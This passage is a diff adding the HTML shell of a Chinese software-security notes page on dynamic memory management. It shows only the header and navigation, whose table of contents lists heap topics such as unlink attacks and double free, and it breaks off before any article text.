@@ -1,0 +1,2673 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="信息安全、前端相关">
+      
+      
+        <meta name="author" content="Jason">
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.3.1, mkdocs-material-8.4.2">
+    
+    
+      
+        <title>动态内存管理 - Jason的笔记小屋</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.69437709.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.cbb835fc.min.css">
+        
+      
+      
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/ex.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent="">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../index.html" title="Jason的笔记小屋" class="md-header__button md-logo" aria-label="Jason的笔记小屋" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19.35 10.03A7.49 7.49 0 0 0 12 4C9.11 4 6.6 5.64 5.35 8.03A6.004 6.004 0 0 0 0 14a6 6 0 0 0 6 6h13a5 5 0 0 0 5-5c0-2.64-2.05-4.78-4.65-4.97Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Jason的笔记小屋
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              动态内存管理
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <form class="md-header__option" data-md-component="palette">
+        
+          
+          
+          <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent=""  aria-label="切换至夜间模式"  type="radio" name="__palette" id="__palette_1">
+          
+            <label class="md-header__button md-icon" title="切换至夜间模式" for="__palette_2" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+            </label>
+          
+        
+          
+          
+          <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="" data-md-color-accent=""  aria-label="切换至白天模式"  type="radio" name="__palette" id="__palette_2">
+          
+            <label class="md-header__button md-icon" title="切换至白天模式" for="__palette_1" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3Z"/></svg>
+            </label>
+          
+        
+      </form>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="清空当前内容" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/jasonren0403/notes" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.1.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    jasonren0403/notes
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../index.html" class="md-tabs__link">
+      主页
+    </a>
+  </li>
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../web_basic/index.html" class="md-tabs__link">
+        web开发技术基础
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+    
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="index.html" class="md-tabs__link md-tabs__link--active">
+        软件安全
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../net_security/index.html" class="md-tabs__link">
+        网络安全
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../408-helper/index.html" class="md-tabs__link">
+        408助手
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../tags.html" class="md-tabs__link">
+      按标签查找
+    </a>
+  </li>
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../index.html" title="Jason的笔记小屋" class="md-nav__button md-logo" aria-label="Jason的笔记小屋" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19.35 10.03A7.49 7.49 0 0 0 12 4C9.11 4 6.6 5.64 5.35 8.03A6.004 6.004 0 0 0 0 14a6 6 0 0 0 6 6h13a5 5 0 0 0 5-5c0-2.64-2.05-4.78-4.65-4.97Z"/></svg>
+
+    </a>
+    Jason的笔记小屋
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/jasonren0403/notes" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.1.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    jasonren0403/notes
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../index.html" class="md-nav__link">
+        主页
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" checked>
+      
+      
+      
+        
+          
+            
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        
+        
+        <div class="md-nav__link md-nav__link--index ">
+          <a href="../web_basic/index.html">web开发技术基础</a>
+          
+            <label for="__nav_2">
+              <span class="md-nav__icon md-icon"></span>
+            </label>
+          
+        </div>
+      
+      <nav class="md-nav" aria-label="web开发技术基础" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          web开发技术基础
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../web_basic/basic-structure.html" class="md-nav__link">
+        Web的基本架构
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../web_basic/html.html" class="md-nav__link">
+        HTML
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../web_basic/css.html" class="md-nav__link">
+        CSS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../web_basic/javascript.html" class="md-nav__link">
+        JavaScript
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../web_basic/dom.html" class="md-nav__link">
+        DOM
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" checked>
+      
+      
+      
+        
+          
+            
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        
+        
+        <div class="md-nav__link md-nav__link--index ">
+          <a href="index.html">软件安全</a>
+          
+            <label for="__nav_3">
+              <span class="md-nav__icon md-icon"></span>
+            </label>
+          
+        </div>
+      
+      <nav class="md-nav" aria-label="软件安全" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          软件安全
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="basic.html" class="md-nav__link">
+        软件基础
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="string.html" class="md-nav__link">
+        字符串安全
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="pointer.html" class="md-nav__link">
+        指针安全
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          动态内存管理
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="memory-management.html" class="md-nav__link md-nav__link--active">
+        动态内存管理
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    动态内存管理函数
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    内存管理器
+  </a>
+  
+    <nav class="md-nav" aria-label="内存管理器">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    常见内存管理错误
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dlmalloc" class="md-nav__link">
+    dlmalloc
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#unlink" class="md-nav__link">
+    unlink技术 → 解链攻击
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#frontlink" class="md-nav__link">
+    frontlink技术 → 入链攻击
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    双重释放
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rtlrun-time-library" class="md-nav__link">
+    RTL（Run Time Library）堆
+  </a>
+  
+    <nav class="md-nav" aria-label="RTL（Run Time Library）堆">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#windows" class="md-nav__link">
+    Windows内存管理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rtl" class="md-nav__link">
+    RTL 数据结构
+  </a>
+  
+    <nav class="md-nav" aria-label="RTL 数据结构">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    基于堆的缓冲区溢出攻击
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    可能存在的漏洞
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    缓解漏洞：空指针
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="integer-security.html" class="md-nav__link">
+        整数安全
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="string-format.html" class="md-nav__link">
+        格式化输出
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="concurrency.html" class="md-nav__link">
+        并发
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="io.html" class="md-nav__link">
+        文件输入输出
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="practice.html" class="md-nav__link">
+        软件安全实践
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" checked>
+      
+      
+      
+        
+          
+            
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        
+        
+        <div class="md-nav__link md-nav__link--index ">
+          <a href="../net_security/index.html">网络安全</a>
+          
+            <label for="__nav_4">
+              <span class="md-nav__icon md-icon"></span>
+            </label>
+          
+        </div>
+      
+      <nav class="md-nav" aria-label="网络安全" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          网络安全
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../net_security/assets.html" class="md-nav__link">
+        网络安全概述
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../net_security/characteristics.html" class="md-nav__link">
+        网络攻击的特征
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../net_security/networkattack.html" class="md-nav__link">
+        网络攻击
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../net_security/hook.html" class="md-nav__link">
+        HOOK
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../net_security/apt.html" class="md-nav__link">
+        APT
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../net_security/defense.html" class="md-nav__link">
+        内生安全与拟态防御
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../net_security/sdn.html" class="md-nav__link">
+        软件定义网络
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../net_security/side-channel.html" class="md-nav__link">
+        侧信道攻击
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../net_security/firewall.html" class="md-nav__link">
+        防火墙
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../net_security/ids.html" class="md-nav__link">
+        入侵检测
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../net_security/vpn.html" class="md-nav__link">
+        虚拟专用网
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../net_security/application.html" class="md-nav__link">
+        应用安全——PGP为例
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../net_security/socialengineering.html" class="md-nav__link">
+        社会工程学
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" checked>
+      
+      
+      
+        
+          
+            
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        
+        
+        <div class="md-nav__link md-nav__link--index ">
+          <a href="../408-helper/index.html">408助手</a>
+          
+            <label for="__nav_5">
+              <span class="md-nav__icon md-icon"></span>
+            </label>
+          
+        </div>
+      
+      <nav class="md-nav" aria-label="408助手" data-md-level="1">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          408助手
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../408-helper/what-does-408-test.html" class="md-nav__link">
+        408考试大纲（2020版）
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" data-md-toggle="__nav_5_3" type="checkbox" id="__nav_5_3" checked>
+      
+      
+      
+        
+          
+            
+          
+        
+          
+        
+      
+      
+        
+        
+        <div class="md-nav__link md-nav__link--index ">
+          <a href="../408-helper/computer-structure/index.html">计算机组成原理</a>
+          
+            <label for="__nav_5_3">
+              <span class="md-nav__icon md-icon"></span>
+            </label>
+          
+        </div>
+      
+      <nav class="md-nav" aria-label="计算机组成原理" data-md-level="2">
+        <label class="md-nav__title" for="__nav_5_3">
+          <span class="md-nav__icon md-icon"></span>
+          计算机组成原理
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../408-helper/computer-structure/operating.html" class="md-nav__link">
+        运算器
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" data-md-toggle="__nav_5_4" type="checkbox" id="__nav_5_4" checked>
+      
+      
+      
+        
+          
+            
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        
+        
+        <div class="md-nav__link md-nav__link--index ">
+          <a href="../408-helper/data-structure/index.html">数据结构</a>
+          
+            <label for="__nav_5_4">
+              <span class="md-nav__icon md-icon"></span>
+            </label>
+          
+        </div>
+      
+      <nav class="md-nav" aria-label="数据结构" data-md-level="2">
+        <label class="md-nav__title" for="__nav_5_4">
+          <span class="md-nav__icon md-icon"></span>
+          数据结构
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../408-helper/data-structure/linear-list.html" class="md-nav__link">
+        线性表
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
